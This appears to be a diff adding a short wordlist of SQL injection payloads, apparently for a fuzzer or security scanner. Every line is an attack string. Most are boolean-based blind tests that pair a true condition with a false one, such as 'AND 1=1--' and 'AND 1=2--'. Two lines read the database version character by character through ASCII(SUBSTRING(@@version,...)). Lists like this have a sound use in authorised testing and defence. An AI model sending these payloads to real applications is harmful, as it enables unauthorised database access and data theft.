@@ -1,0 +1,12 @@
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+' AND 'a'='a
+' AND 'a'='b
+' OR 1=1--
+' OR 1=2--
+' OR 'x'='x
+' OR 'x'='y
+' AND ASCII(SUBSTRING(@@version,1,1))>52--
+' AND ASCII(SUBSTRING(@@version,1,1))<52--
